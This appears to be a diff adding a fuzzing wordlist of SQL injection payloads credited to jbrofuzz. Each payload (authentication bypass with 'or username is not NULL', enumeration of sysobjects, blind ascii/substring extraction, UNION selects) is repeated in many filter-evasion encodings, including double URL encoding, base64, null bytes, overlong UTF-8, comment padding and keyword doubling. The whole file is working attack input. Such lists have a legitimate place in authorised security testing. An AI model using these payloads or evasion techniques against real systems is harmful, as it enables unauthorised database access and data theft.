@@ -1,0 +1,782 @@
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+%00
+IyBDb250YWlucyBzdGF0ZW1lbnRzIGZyb20gamJyb2Z1enogKDEzIEFwcmlsIDIwMTApCg==
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+%2523%2520%2543%256F%256E%2574%2561%2569%256E%2573%2520%2573%2574%2561%2574%2565%256D%2565%256E%2574%2573%2520%2566%2572%256F%256D%2520%256A%2562%2572%256F%2566%2575%257A%257A%2520%2528%2531%2533%2520%2541%2570%2572%2569%256C%2520%2532%2530%2531%2530%2529%250A
+%23%20%43%6F%6E%74%61%69%6E%73%20%73%74%61%74%65%6D%65%6E%74%73%20%66%72%6F%6D%20%6A%62%72%6F%66%75%7A%7A%20%28%31%33%20%41%70%72%69%6C%20%32%30%31%30%29%0A
+%u0023%u0020%u0043%u006F%u006E%u0074%u0061%u0069%u006E%u0073%u0020%u0073%u0074%u0061%u0074%u0065%u006D%u0065%u006E%u0074%u0073%u0020%u0066%u0072%u006F%u006D%u0020%u006A%u0062%u0072%u006F%u0066%u0075%u007A%u007A%u0020%u0028%u0031%u0033%u0020%u0041%u0070%u0072%u0069%u006C%u0020%u0032%u0030%u0031%u0030%u0029%u000A
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements FFROMROM jbrofuzz (13 April 2010)
+
+%C0%AB%C0%AAContains%C0%AAstatements%C0%AAfrom%C0%AAjbrofuzz%C0%AA%C0%AA13%C0%AAApril%C0%AA2010%C0%AB%C0%8A
+%# %C%o%n%t%a%i%n%s %s%t%a%t%e%m%e%n%t%s %f%r%o%m %j%b%r%o%f%u%z%z %(%1%3 %A%p%r%i%l %2%0%1%0%)%
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+ and '0having'='0having'
+# Contains statements from jbrofuzz (13 April 2010)
+sp_password
+#/**/Contains/**/statements/**/from/**/jbrofuzz/**/(13/**/April/**/2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+#%0BContains%08statements%0Dfrom%0Ejbrofuzz%04(13%0AApril%0D2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+#%0DContains%0Bstatements%09from%0Djbrofuzz%09(13%09April%0A2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+#+Contains+statements+from+jbrofuzz+(13+April+2010)
+
+#%09Contains%0Dstatements%0Cfrom%0Ajbrofuzz%0A(13%0AApril%0A2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+# Contains statements from jbrofuzz (13 April 2010)
+
+1
+
+1
+
+1
+%00
+MQo=
+1
+
+1
+
+%2531%250A
+%31%0A
+%u0031%u000A
+1
+
+1
+
+1
+
+1
+
+1
+
+1
+
+1
+
+1
+
+1
+
+1
+
+1%C0%8A
+%1%
+
+1
+
+1
+
+1
+ and '0having'='0having'
+1
+-- sp_password
+1/**/
+1--jFzxqeQ%0A
+1%23GHVBqBcdqHUd%0A
+1%23gJSPxgsu%0A
+1%0E
+1%23%0A
+1%0A
+1--%0A
+1+
+1%09
+1
+
+1
+
+1
+
+1
+
+1
+
+1
+
+1 and user_name() = %EF%BC%87dbo%EF%BC%87
+
+1 and user_name() = %00%27dbo%00%27
+
+1 and user_name() = 'dbo'
+%00
+MSBhbmQgdXNlcl9uYW1lKCkgPSAnZGJvJwo=
+1 and user_name() = 'dbo'
+
+1 and user_name() LIKE 'dbo'
+
+%2531%2520%2561%256E%2564%2520%2575%2573%2565%2572%255F%256E%2561%256D%2565%2528%2529%2520%253D%2520%2527%2564%2562%256F%2527%250A
+%31%20%61%6E%64%20%75%73%65%72%5F%6E%61%6D%65%28%29%20%3D%20%27%64%62%6F%27%0A
+%u0031%u0020%u0061%u006E%u0064%u0020%u0075%u0073%u0065%u0072%u005F%u006E%u0061%u006D%u0065%u0028%u0029%u0020%u003D%u0020%u0027%u0064%u0062%u006F%u0027%u000A
+1 and user_name() = 'dbo'
+
+1 and user_name()LIKE'dbo'
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+
+1 /*!30760and user_name() = 'dbo'
+*/
+1 /*!00000and user_name() = 'dbo'
+*/
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+
+1%C0%AAand%C0%AAuser%C0%DFname%C0%AA%C0%AB%C0%AA%C0%BF%C0%AA%C0%AFdbo%C0%AF%C0%8A
+%1 %a%n%d %u%s%e%r%_%n%a%m%e%(%) %= %'%d%b%o%'%
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+ and '0having'='0having'
+1 and user_name() = 'dbo'
+-- sp_password
+1/**/and/**/user_name()/**/=/**/'dbo'
+
+1--pPgFWor%0Aand--HDYnVBFb%0Auser_name()--LScltIWvZsp%0A=--lhTNVlNZG%0A'dbo'--XABakismc%0A
+1%23JHuSVdKspw%0Aand%23yZJHvw%0Auser_name()%23ODkFqFIf%0A=%23KGLxGlGwX%0A'dbo'%23CtibnPmsTPwK%0A
+1%23XpTzENt%0Aand%23qUlFtDqWn%0Auser_name()%23ZPHylXvGZin%0A=%23kLmtjw%0A'dbo'%23ziUpaT%0A
+1%07and%08user_name()%07=%0A'dbo'
+
+1%23%0Aand%23%0Auser_name()%23%0A=%23%0A'dbo'%23%0A
+1%0Dand%0Auser_name()%0B=%0B'dbo'
+
+1--%0Aand--%0Auser_name()--%0A=--%0A'dbo'--%0A
+1+and+user_name()+=+'dbo'
+
+1%0Cand%09user_name()%0A=%0A'dbo'
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = %bf%27dbo'
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+
+1 and user_name() = 'dbo'
+
+\%EF%BC%87; desc users; --
+
+\%00%27; desc users; --
+
+\'; desc users; --
+%00
+XCc7IGRlc2MgdXNlcnM7IC0tCg==
+\'; desc users; --
+
+\'; desc users; --
+
+%255C%2527%253B%2520%2564%2565%2573%2563%2520%2575%2573%2565%2572%2573%253B%2520%252D%252D%250A
+%5C%27%3B%20%64%65%73%63%20%75%73%65%72%73%3B%20%2D%2D%0A
+%u005C%u0027%u003B%u0020%u0064%u0065%u0073%u0063%u0020%u0075%u0073%u0065%u0072%u0073%u003B%u0020%u002D%u002D%u000A
+\'; desc users; --
+
+\'; desc users; --
+
+\'; desc users; --
+
+\'; desc users; --
+
+\'; desc users; --
+
+\'; desc users; --
+
+\'; /*!30471desc users; */--
+
+\'; /*!00000desc users; */--
+
+\'; desc users; --
+
+\'; desc users; --
+
+%C0%DE%C0%AF%C0%BB%C0%AAdesc%C0%AAusers%C0%BB%C0%AA%C0%AF%C0%AF%C0%8A
+%\%'%; %d%e%s%c %u%s%e%r%s%; %-%-%
+
+\'; desc users; --
+
+\'; desc users; --
+
+\'; desc users; --
+ and '0having'='0having'
+\'; desc users; --
+-- sp_password
+\';/**/desc/**/users;/**/--
+
+\';--PyIAUPjhmsxu%0Adesc--CIGTzWTooxo%0Ausers;--aOgSCyOyM%0A----CuhXxDaN%0A
+\';%23ocYFQQAPDajF%0Adesc%23kRvsNycen%0Ausers;%23DHsGHEq%0A--%23RibsxZt%0A
+\';%23AIlBOYidRgzf%0Adesc%23yWqDeSjpo%0Ausers;%23giySNTebgX%0A--%23fHocSnv%0A
+\';%09desc%0Eusers;%05--
+
+\';%23%0Adesc%23%0Ausers;%23%0A--%23%0A
+\';%0Adesc%09users;%0A--
+
+\';--%0Adesc--%0Ausers;--%0A----%0A
+\';+desc+users;+--
+
+\';%0Cdesc%09users;%09--
+
+\'; desc users; --
+
+\%bf%27; desc users; --
+
+\'; desc users; --
+
+\'; desc users; --
+
+\'; desc users; --
+
+\'; desc users; --
+
+1\%EF%BC%871
+
+1\%00%271
+
+1\'1
+%00
+MVwnMQo=
+1\'1
+
+1\'1
+
+%2531%255C%2527%2531%250A
+%31%5C%27%31%0A
+%u0031%u005C%u0027%u0031%u000A
+1\'1
+
+1\'1
+
+1\'1
+
+1\'1
+
+1\'1
+
+1\'1
+
+1\'1
+
+1\'1
+
+1\'1
+
+1\'1
+
+1%C0%DE%C0%AF1%C0%8A
+%1%\%'%1%
+
+1\'1
+
+1\'1
+
+1\'1
+ and '0having'='0having'
+1\'1
+-- sp_password
+1\'1/**/
+1\'1--xjyFmeRm%0A
+1\'1%23YTgTnC%0A
+1\'1%23uUAeADXWwzFg%0A
+1\'1%0C
+1\'1%23%0A
+1\'1%0C
+1\'1--%0A
+1\'1+
+1\'1%0C
+1\'1
+
+1\%bf%271
+
+1\'1
+
+1\'1
+
+1\'1
+
+1\'1
+
+1%EF%BC%87 and non_existant_table = %EF%BC%871
+
+1%00%27 and non_existant_table = %00%271
+
+1' and non_existant_table = '1
+%00
+MScgYW5kIG5vbl9leGlzdGFudF90YWJsZSA9ICcxCg==
+1' and non_existant_table = '1
+
+1' and non_existant_table LIKE '1
+
+%2531%2527%2520%2561%256E%2564%2520%256E%256F%256E%255F%2565%2578%2569%2573%2574%2561%256E%2574%255F%2574%2561%2562%256C%2565%2520%253D%2520%2527%2531%250A
+%31%27%20%61%6E%64%20%6E%6F%6E%5F%65%78%69%73%74%61%6E%74%5F%74%61%62%6C%65%20%3D%20%27%31%0A
+%u0031%u0027%u0020%u0061%u006E%u0064%u0020%u006E%u006F%u006E%u005F%u0065%u0078%u0069%u0073%u0074%u0061%u006E%u0074%u005F%u0074%u0061%u0062%u006C%u0065%u0020%u003D%u0020%u0027%u0031%u000A
+1' and non_existant_table = '1
+
+1' and non_existant_tableLIKE'1
+
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+1' /*!30583and non_existant_table = '1
+*/
+1' /*!00000and non_existant_table = '1
+*/
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+1%C0%AF%C0%AAand%C0%AAnon%C0%DFexistant%C0%DFtable%C0%AA%C0%BF%C0%AA%C0%AF1%C0%8A
+%1%' %a%n%d %n%o%n%_%e%x%i%s%t%a%n%t%_%t%a%b%l%e %= %'%1%
+
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+ and '0having'='0having'
+1' and non_existant_table = '1
+-- sp_password
+1'/**/and/**/non_existant_table/**/=/**/'1
+
+1'--MuTySiXHs%0Aand--QMDdjxdOdarE%0Anon_existant_table--eanekeyJSxXD%0A=--gRBvNELExY%0A'1--DzVQJt%0A
+1'%23unSJojWk%0Aand%23TuwwRbaMj%0Anon_existant_table%23PBGRYIFyJY%0A=%23OdmRWtG%0A'1%23fVRpQGP%0A
+1'%23nsTHMfjMVNxI%0Aand%23YzZqzg%0Anon_existant_table%23lnScAeEOi%0A=%23ZubKSexibL%0A'1%23cjZxECwP%0A
+1'%05and%0Enon_existant_table%0D=%08'1
+
+1'%23%0Aand%23%0Anon_existant_table%23%0A=%23%0A'1%23%0A
+1'%0Cand%0Dnon_existant_table%0B=%0D'1
+
+1'--%0Aand--%0Anon_existant_table--%0A=--%0A'1--%0A
+1'+and+non_existant_table+=+'1
+
+1'%09and%0Anon_existant_table%09=%0D'1
+
+1' and non_existant_table = '1
+
+1%bf%27 and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+1' and non_existant_table = '1
+
+%EF%BC%87 or username is not NULL or username = %EF%BC%87
+
+%00%27 or username is not NULL or username = %00%27
+
+' or username is not NULL or username = '
+%00
+JyBvciB1c2VybmFtZSBpcyBub3QgTlVMTCBvciB1c2VybmFtZSA9ICcK
+' or username is not NULL or username = '
+
+' or username is not NULL or username LIKE '
+
+%2527%2520%256F%2572%2520%2575%2573%2565%2572%256E%2561%256D%2565%2520%2569%2573%2520%256E%256F%2574%2520%254E%2555%254C%254C%2520%256F%2572%2520%2575%2573%2565%2572%256E%2561%256D%2565%2520%253D%2520%2527%250A
+%27%20%6F%72%20%75%73%65%72%6E%61%6D%65%20%69%73%20%6E%6F%74%20%4E%55%4C%4C%20%6F%72%20%75%73%65%72%6E%61%6D%65%20%3D%20%27%0A
+%u0027%u0020%u006F%u0072%u0020%u0075%u0073%u0065%u0072%u006E%u0061%u006D%u0065%u0020%u0069%u0073%u0020%u006E%u006F%u0074%u0020%u004E%u0055%u004C%u004C%u0020%u006F%u0072%u0020%u0075%u0073%u0065%u0072%u006E%u0061%u006D%u0065%u0020%u003D%u0020%u0027%u000A
+' or username is not NULL or username = '
+
+' or username is not NULL or usernameLIKE'
+
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+' /*!30407or username is not NULL or username = '
+*/
+' /*!00000or username is not NULL or username = '
+*/
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+%C0%AF%C0%AAor%C0%AAusername%C0%AAis%C0%AAnot%C0%AANULL%C0%AAor%C0%AAusername%C0%AA%C0%BF%C0%AA%C0%AF%C0%8A
+%' %o%r %u%s%e%r%n%a%m%e %i%s %n%o%t %N%U%L%L %o%r %u%s%e%r%n%a%m%e %= %'%
+
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+ and '0having'='0having'
+' or username is not NULL or username = '
+-- sp_password
+'/**/or/**/username/**/is/**/not/**/NULL/**/or/**/username/**/=/**/'
+
+'--rVPANAHz%0Aor--NOSlwmyc%0Ausername--ZaaTQtHADoe%0Ais--EZUfmTC%0Anot--jyMCdYOxL%0ANULL--TVBgrxsCSYp%0Aor--jKELSnT%0Ausername--neBeHi%0A=--rzvHklyN%0A'--NjmmepW%0A
+'%23xDJJsFQrEtI%0Aor%23sTRgFhlr%0Ausername%23OAiFZuExnF%0Ais%23hnrGdredD%0Anot%23yWnOUKuZ%0ANULL%23HGcPrHA%0Aor%23BTmaBpDDWH%0Ausername%23qEkFWBI%0A=%23lRjHwa%0A'%23hVvehjuCek%0A
+'%23CvIWxHJeTzY%0Aor%23KhSETv%0Ausername%23LvHrmODSesl%0Ais%23jlKmTjqLpE%0Anot%23YMWKQSst%0ANULL%23vJFXhjGbn%0Aor%23kbqWpHFE%0Ausername%23gefZUPZ%0A=%23DWuStmj%0A'%23oAxCDBy%0A
+'%04or%0Ausername%0Fis%02not%0BNULL%06or%0Ausername%01=%04'
+
+'%23%0Aor%23%0Ausername%23%0Ais%23%0Anot%23%0ANULL%23%0Aor%23%0Ausername%23%0A=%23%0A'%23%0A
+'%0Dor%0Busername%0Bis%0Cnot%0DNULL%09or%0Dusername%0A=%0C'
+
+'--%0Aor--%0Ausername--%0Ais--%0Anot--%0ANULL--%0Aor--%0Ausername--%0A=--%0A'--%0A
+'+or+username+is+not+NULL+or+username+=+'
+
+'%0Cor%0Ausername%0Cis%0Anot%0CNULL%0Aor%0Cusername%09=%0D'
+
+' or username is not NULL or username = '
+
+%bf%27 or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+' or username is not NULL or username = '
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype=%EF%BC%87u%EF%BC%87), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype=%00%27u%00%27), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+%00
+MSBhbmQgYXNjaWkobG93ZXIoc3Vic3RyaW5nKChzZWxlY3QgdG9wIDEgbmFtZSBmcm9tIHN5c29iamVjdHMgd2hlcmUgeHR5cGU9J3UnKSwgMSwgMSkpKSA+IDExNgo=
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) NOT BETWEEN 0 AND 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype LIKE 'u'), 1, 1))) > 116
+
+%2531%2520%2561%256E%2564%2520%2561%2573%2563%2569%2569%2528%256C%256F%2577%2565%2572%2528%2573%2575%2562%2573%2574%2572%2569%256E%2567%2528%2528%2573%2565%256C%2565%2563%2574%2520%2574%256F%2570%2520%2531%2520%256E%2561%256D%2565%2520%2566%2572%256F%256D%2520%2573%2579%2573%256F%2562%256A%2565%2563%2574%2573%2520%2577%2568%2565%2572%2565%2520%2578%2574%2579%2570%2565%253D%2527%2575%2527%2529%252C%2520%2531%252C%2520%2531%2529%2529%2529%2520%253E%2520%2531%2531%2536%250A
+%31%20%61%6E%64%20%61%73%63%69%69%28%6C%6F%77%65%72%28%73%75%62%73%74%72%69%6E%67%28%28%73%65%6C%65%63%74%20%74%6F%70%20%31%20%6E%61%6D%65%20%66%72%6F%6D%20%73%79%73%6F%62%6A%65%63%74%73%20%77%68%65%72%65%20%78%74%79%70%65%3D%27%75%27%29%2C%20%31%2C%20%31%29%29%29%20%3E%20%31%31%36%0A
+%u0031%u0020%u0061%u006E%u0064%u0020%u0061%u0073%u0063%u0069%u0069%u0028%u006C%u006F%u0077%u0065%u0072%u0028%u0073%u0075%u0062%u0073%u0074%u0072%u0069%u006E%u0067%u0028%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0074%u006F%u0070%u0020%u0031%u0020%u006E%u0061%u006D%u0065%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u006F%u0062%u006A%u0065%u0063%u0074%u0073%u0020%u0077%u0068%u0065%u0072%u0065%u0020%u0078%u0074%u0079%u0070%u0065%u003D%u0027%u0075%u0027%u0029%u002C%u0020%u0031%u002C%u0020%u0031%u0029%u0029%u0029%u0020%u003E%u0020%u0031%u0031%u0036%u000A
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype LIKE 'u'), 1, 1))) > 116
+
+1 and GREATEST(ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))),116
++1)=ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1)))
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 /*!30722and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+*/
+1 /*!00000and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+*/
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((SELESELECTCT top 1 name FROFROMM sysobjects WHWHEREERE xtype='u'), 1, 1))) > 116
+
+1%C0%AAand%C0%AAascii%C0%AAlower%C0%AAsubstring%C0%AA%C0%AAselect%C0%AAtop%C0%AA1%C0%AAname%C0%AAfrom%C0%AAsysobjects%C0%AAwhere%C0%AAxtype%C0%BF%C0%AFu%C0%AF%C0%AB%C0%AE%C0%AA1%C0%AE%C0%AA1%C0%AB%C0%AB%C0%AB%C0%AA%C0%BE%C0%AA116%C0%8A
+%1 %a%n%d %a%s%c%i%i%(%l%o%w%e%r%(%s%u%b%s%t%r%i%n%g%(%(%s%e%l%e%c%t %t%o%p %1 %n%a%m%e %f%r%o%m %s%y%s%o%b%j%e%c%t%s %w%h%e%r%e %x%t%y%p%e%=%'%u%'%)%, %1%, %1%)%)%) %> %1%1%6%
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+ and '0having'='0having'
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+-- sp_password
+1/**/and/**/ascii(lower(substring((select/**/top/**/1/**/name/**/from/**/sysobjects/**/where/**/xtype='u'),/**/1,/**/1)))/**/>/**/116
+
+1--dJPjkiRII%0Aand--kIafWLvimT%0Aascii(lower(substring((select--EuGwWSnsgVTE%0Atop--auveILB%0A1--PfUJCKpdE%0Aname--YGsMeIyfoUW%0Afrom--jgrZrjViP%0Asysobjects--pkdhbVHnHdc%0Awhere--JZxitpq%0Axtype='u'),--HTatpd%0A1,--cMMOTqmWPds%0A1)))--vqeVVIWTPk%0A>--KwkdyuTswZ%0A116--DyVlif%0A
+1%23iDKxQG%0Aand%23RKujEpNshOja%0Aascii(lower(substring((select%23SrVMsWpdeoD%0Atop%23sdWiVOv%0A1%23QSaMHMStmW%0Aname%23oHCJAdo%0Afrom%23WSlKxGWP%0Asysobjects%23DZxWCxmgqNi%0Awhere%23UfyutOptOrLF%0Axtype='u'),%23yBFvekiANUcQ%0A1,%23BzJBSjfu%0A1)))%23TTCmCOde%0A>%23GNbiZmPdHl%0A116%23XwFFVWWHWnGV%0A
+1%23VeYgNjCPvt%0Aand%23CKCYiLohqu%0Aascii(lower(substring((select%23KOxbSzRBni%0Atop%23ilYClP%0A1%23CeBwWEbRu%0Aname%23ETJfDEsLzj%0Afrom%23cOaJIo%0Asysobjects%23cjoFgc%0Awhere%23lkhUAQ%0Axtype='u'),%23mNIcrC%0A1,%23WEUeNWNFDOru%0A1)))%23OQhPdl%0A>%23mtemkq%0A116%23WssFmkOqBM%0A
+1%0Dand%0Aascii(lower(substring((select%08top%031%01name%08from%02sysobjects%02where%05xtype='u'),%0C1,%0C1)))%08>%04116
+
+1%23%0Aand%23%0Aascii(lower(substring((select%23%0Atop%23%0A1%23%0Aname%23%0Afrom%23%0Asysobjects%23%0Awhere%23%0Axtype='u'),%23%0A1,%23%0A1)))%23%0A>%23%0A116%23%0A
+1%0Band%0Aascii(lower(substring((select%0Dtop%0C1%0Dname%0Afrom%09sysobjects%0Cwhere%0Cxtype='u'),%091,%0D1)))%0D>%0C116
+
+1--%0Aand--%0Aascii(lower(substring((select--%0Atop--%0A1--%0Aname--%0Afrom--%0Asysobjects--%0Awhere--%0Axtype='u'),--%0A1,--%0A1)))--%0A>--%0A116--%0A
+1+and+ascii(lower(substring((select+top+1+name+from+sysobjects+where+xtype='u'),+1,+1)))+>+116
+
+1%0Cand%0Aascii(lower(substring((select%0Atop%091%0Dname%0Afrom%0Dsysobjects%0Awhere%0Dxtype='u'),%0D1,%091)))%0D>%0A116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype=%bf%27u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = %EF%BC%87u%EF%BC%87 --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = %00%27u%00%27 --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+%00
+MSB1bmlvbiBhbGwgc2VsZWN0IDEsMiwzLDQsNSw2LG5hbWUgZnJvbSBzeXNvYmplY3RzIHdoZXJlIHh0eXBlID0gJ3UnIC0tCg==
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype LIKE 'u' --
+
+%2531%2520%2575%256E%2569%256F%256E%2520%2561%256C%256C%2520%2573%2565%256C%2565%2563%2574%2520%2531%252C%2532%252C%2533%252C%2534%252C%2535%252C%2536%252C%256E%2561%256D%2565%2520%2566%2572%256F%256D%2520%2573%2579%2573%256F%2562%256A%2565%2563%2574%2573%2520%2577%2568%2565%2572%2565%2520%2578%2574%2579%2570%2565%2520%253D%2520%2527%2575%2527%2520%252D%252D%250A
+%31%20%75%6E%69%6F%6E%20%61%6C%6C%20%73%65%6C%65%63%74%20%31%2C%32%2C%33%2C%34%2C%35%2C%36%2C%6E%61%6D%65%20%66%72%6F%6D%20%73%79%73%6F%62%6A%65%63%74%73%20%77%68%65%72%65%20%78%74%79%70%65%20%3D%20%27%75%27%20%2D%2D%0A
+%u0031%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0061%u006C%u006C%u0020%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0031%u002C%u0032%u002C%u0033%u002C%u0034%u002C%u0035%u002C%u0036%u002C%u006E%u0061%u006D%u0065%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u006F%u0062%u006A%u0065%u0063%u0074%u0073%u0020%u0077%u0068%u0065%u0072%u0065%u0020%u0078%u0074%u0079%u0070%u0065%u0020%u003D%u0020%u0027%u0075%u0027%u0020%u002D%u002D%u000A
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtypeLIKE'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 /*!30136union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' */--
+
+1 /*!00000union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' */--
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 UNIOUNIONN all SESELECTLECT 1,2,3,4,5,6,name FROFROMM sysobjects WHWHEREERE xtype = 'u' --
+
+1%C0%AAunion%C0%AAall%C0%AAselect%C0%AA1%C0%AE2%C0%AE3%C0%AE4%C0%AE5%C0%AE6%C0%AEname%C0%AAfrom%C0%AAsysobjects%C0%AAwhere%C0%AAxtype%C0%AA%C0%BF%C0%AA%C0%AFu%C0%AF%C0%AA%C0%AF%C0%AF%C0%8A
+%1 %u%n%i%o%n %a%l%l %s%e%l%e%c%t %1%,%2%,%3%,%4%,%5%,%6%,%n%a%m%e %f%r%o%m %s%y%s%o%b%j%e%c%t%s %w%h%e%r%e %x%t%y%p%e %= %'%u%' %-%-%
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+ and '0having'='0having'
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+-- sp_password
+1/**/union/**/all/**/select/**/1,2,3,4,5,6,name/**/from/**/sysobjects/**/where/**/xtype/**/=/**/'u'/**/--
+
+1--SSrywctlm%0Aunion--eThmNEvRVQFh%0Aall--GsnZpOMMNX%0Aselect--VFCJHvpoUl%0A1,2,3,4,5,6,name--GPKYDir%0Afrom--vvyxman%0Asysobjects--IWSIRxO%0Awhere--rBYSEWmdE%0Axtype--naCxDSPCYDPD%0A=--HYprbgKMBnt%0A'u'--XuLvifMy%0A----fwtGTEVFD%0A
+1%23TBdakeBfjr%0Aunion%23ytaHKhy%0Aall%23GMgDXlK%0Aselect%23GDpuyHQnz%0A1,2,3,4,5,6,name%23iDLUke%0Afrom%23cLxECuw%0Asysobjects%23aOjYVpzV%0Awhere%23EibYSJqVUzET%0Axtype%23ngoWMj%0A=%23FbBPCluR%0A'u'%23ABrMFmDC%0A--%23rTXeNtedd%0A
+1%23GedMYLkOH%0Aunion%23rQQvVDUdIW%0Aall%23CxZReun%0Aselect%23tlhsEmR%0A1,2,3,4,5,6,name%23swRpEVCfIFg%0Afrom%23PUmzfyqNx%0Asysobjects%23yYqpoy%0Awhere%23dkFLhookNc%0Axtype%23WJHaDhS%0A=%23vuMZmTQr%0A'u'%23jnFupeHF%0A--%23AfMoPL%0A
+1%0Bunion%02all%0Aselect%0B1,2,3,4,5,6,name%05from%0Csysobjects%0Cwhere%0Cxtype%03=%0A'u'%08--
+
+1%23%0Aunion%23%0Aall%23%0Aselect%23%0A1,2,3,4,5,6,name%23%0Afrom%23%0Asysobjects%23%0Awhere%23%0Axtype%23%0A=%23%0A'u'%23%0A--%23%0A
+1%0Aunion%0Dall%0Dselect%0D1,2,3,4,5,6,name%0Afrom%0Dsysobjects%09where%0Bxtype%0A=%0B'u'%0B--
+
+1--%0Aunion--%0Aall--%0Aselect--%0A1,2,3,4,5,6,name--%0Afrom--%0Asysobjects--%0Awhere--%0Axtype--%0A=--%0A'u'--%0A----%0A
